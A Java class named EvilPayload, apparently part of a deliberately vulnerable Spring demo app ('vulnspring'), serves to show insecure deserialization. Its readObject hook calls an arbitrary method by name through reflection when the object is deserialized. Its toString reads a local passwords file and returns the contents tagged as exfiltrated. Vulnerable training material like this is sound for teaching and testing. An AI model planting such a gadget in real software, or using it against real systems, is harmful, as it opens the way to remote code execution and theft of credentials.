package com.example.vulnspring.model;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class EvilPayload implements Serializable {
    private static final long serialVersionUID = 1L;


    private static final String PWD_PATH_WIN   =
            "C:\\SC\\passwords.txt";
    private static final String PWD_PATH_UNIX  =
            "/tmp/SC/passwords.txt";

    private Object looselyDefinedThing;
    private String methodName;

    public EvilPayload() { }

    public EvilPayload(Object looselyDefinedThing, String methodName) {
        this.looselyDefinedThing = looselyDefinedThing;
        this.methodName          = methodName;
    }

    public Object getLooselyDefinedThing()           { return looselyDefinedThing; }
    public void   setLooselyDefinedThing(Object o)   { this.looselyDefinedThing = o; }
    public String getMethodName()                    { return methodName; }
    public void   setMethodName(String m)            { this.methodName = m; }


    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        try {
            if (looselyDefinedThing != null && methodName != null) {
                Method m = looselyDefinedThing.getClass().getMethod(methodName);
                m.invoke(looselyDefinedThing);
            }
        } catch (ReflectiveOperationException ex) {
            throw new IOException("Reflective invocation failed", ex);
        }
    }


    @Override
    public String toString() {
        String os = System.getProperty("os.name").toLowerCase();
        Path path = Paths.get(os.contains("win") ? PWD_PATH_WIN : PWD_PATH_UNIX);
        try {
            return "[EXFILTRATED " + path + "]\n" +
                    new String(Files.readAllBytes(path));
        } catch (IOException ex) {
            return "[EvilPayload] could not read " + path + ": " + ex.getMessage();
        }
    }
}
